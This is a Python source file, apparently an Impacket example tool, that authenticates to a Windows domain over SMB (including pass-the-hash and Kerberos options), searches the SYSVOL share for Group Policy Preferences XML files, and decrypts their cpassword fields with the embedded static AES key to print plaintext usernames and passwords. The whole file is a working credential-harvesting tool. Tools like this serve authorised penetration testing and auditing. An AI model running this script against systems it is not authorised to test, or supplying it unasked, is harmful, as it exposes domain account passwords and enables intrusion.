#!/usr/bin/env python3
# todo : licence
# Description: todo
#
# Author:
#  Remi Gascou (@podalirius_)
#  Charlie Bromberg (@_nwodtuhs)
#
# Reference for:
#  SMB DCE/RPC

import argparse
import logging
import chardet
import base64
import sys
import re
import traceback

from xml.dom import minidom
from io import BytesIO

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

from impacket import version
from impacket.examples import logger
from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError, \
    FILE_READ_DATA, FILE_SHARE_READ, FILE_SHARE_WRITE
from impacket.smb3structs import FILE_DIRECTORY_FILE, FILE_LIST_DIRECTORY


class GetGPPasswords(object):
    """docstring for GetGPPasswords."""

    def __init__(self, smb, share):
        super(GetGPPasswords, self).__init__()
        self.smb = smb
        self.share = share

    def list_shares(self):
        logging.info("Listing shares...")
        resp = self.smb.listShares()
        shares = []
        for k in range(len(resp)):
            shares.append(resp[k]['shi1_netname'][:-1])
            print('  - %s' % resp[k]['shi1_netname'][:-1])
        print()

    def find_files(self, base_dir, extension='xml'):
        logging.info("Searching *.%s files..." % extension)
        # Breadth-first search algorithm
        files = []
        #searchdirs = ['/']
        # todo : fix this + '/'
        searchdirs = [base_dir + '/']
        while len(searchdirs) != 0:
            next_dirs = []
            for sdir in searchdirs:
                logging.debug('Searching in %s ' % sdir)
                for sharedfile in self.smb.listPath(self.share, sdir + '*', password=None):
                    if sharedfile.get_longname() not in ['.', '..']:
                        if sharedfile.is_directory():
                            logging.debug('Found directory %s/' % sharedfile.get_longname())
                            next_dirs.append(sdir + sharedfile.get_longname() + '/')
                        else:
                            if sharedfile.get_longname().endswith('.' + extension):
                                logging.info('Found matching file %s' % (sdir + sharedfile.get_longname()))
                                files.append(sdir + sharedfile.get_longname())
                            else:
                                logging.debug('Found file %s' % sharedfile.get_longname())
            searchdirs = next_dirs
            logging.debug('Next iteration with %d folders.' % len(next_dirs))
        logging.debug('Found %d %s files' % (len(files), extension))
        logging.debug('Printing matching files...')
        for f in files:
            logging.debug(f)
        return files

    def parse(self, files=[]):
        results = []
        for filename in files:
            filename = filename.replace('/', '\\')
            fh = BytesIO()
            try:
                self.smb.getFile(self.share, filename, fh.write)
            except SessionError as e:
                logging.error(e)
                return results
            except Exception as e:
                raise
            output = fh.getvalue()
            encoding = chardet.detect(output)["encoding"]
            error_msg = "[-] Output cannot be correctly decoded, are you sure the text is readable ?"
            if encoding != None:
                filecontent = output.decode(encoding)
                logging.debug(filecontent)
                root = minidom.parseString(filecontent)
                properties_list = root.getElementsByTagName("Properties")
                read_or_empty = lambda element, attribute: (
                    element.getAttribute(attribute) if element.getAttribute(attribute) != None else "")
                for properties in properties_list:
                    results.append({
                        'newname': read_or_empty(properties, 'newName'),
                        'changed': read_or_empty(properties.parentNode, 'changed'),
                        'cpassword': read_or_empty(properties, 'cpassword'),
                        'password': self.decrypt_password(read_or_empty(properties, 'cpassword')),
                        'username': read_or_empty(properties, 'userName'),
                        'file': filename
                    })
                fh.close()
            else:
                print(error_msg)
                fh.close()
        return results

    def decrypt_password(self, pw_enc_b64):
        key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20' \
              b'\x9b\x09\xa4\x33\xb6\x6c\x1b'
        iv = b'\x00' * 16
        pad = len(pw_enc_b64) % 4
        if pad == 1:
            pw_enc_b64 = pw_enc_b64[:-1]
        elif pad == 2 or pad == 3:
            pw_enc_b64 += '=' * (4 - pad)
        pw_enc = base64.b64decode(pw_enc_b64)
        ctx = AES.new(key, AES.MODE_CBC, iv)
        pw_dec = unpad(ctx.decrypt(pw_enc), ctx.block_size)
        return pw_dec.decode('utf-16-le')

    def show(self, results):
        print()
        for result in results:
            logging.info(f"NewName\t: {result['newname']}")
            logging.info(f"Changed\t: {result['changed']}")
            logging.info(f"Username\t: {result['username']}")
            logging.info(f"Password\t: {result['password']}")
            logging.info(f"File\t: {result['file']}\n")


def parse_args():
    parser = argparse.ArgumentParser(add_help=True,
                                     description='Group Policy Preferences passwords finder and decryptor')
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument("-share", type=str, required=False, default="SYSVOL", help="SMB Share")
    parser.add_argument("-base-dir", type=str, required=False, default="/", help="Directory to search in (Default: /)")
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')

    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


if __name__ == '__main__':
    print(version.BANNER)
    args = parse_args()

    # Init the example's logger theme
    logger.init(args.ts)

    if args.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        args.target).groups('')

    # In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if args.target_ip is None:
        args.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if args.aesKey is not None:
        args.k = True

    if args.hashes is not None:
        lmhash, nthash = args.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    try:
        smbClient = SMBConnection(address, args.target_ip, sess_port=int(args.port))
        dialect = smbClient.getDialect()
        if dialect == SMB_DIALECT:
            logging.debug("SMBv1 dialect used")
        elif dialect == SMB2_DIALECT_002:
            logging.debug("SMBv2.0 dialect used")
        elif dialect == SMB2_DIALECT_21:
            logging.debug("SMBv2.1 dialect used")
        else:
            logging.debug("SMBv3.0 dialect used")
        if args.k is True:
            smbClient.kerberosLogin(username, password, domain, lmhash, nthash, args.aesKey, args.dc_ip)
        else:
            smbClient.login(username, password, domain, lmhash, nthash)
        if smbClient.isGuestSession() > 0:
            logging.debug("GUEST Session Granted")
        else:
            logging.debug("USER Session Granted")

        g = GetGPPasswords(smbClient, args.share)
        g.list_shares()
        files = g.find_files(args.base_dir)
        results = g.parse(files)
        g.show(results)

    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        logging.error(str(e))
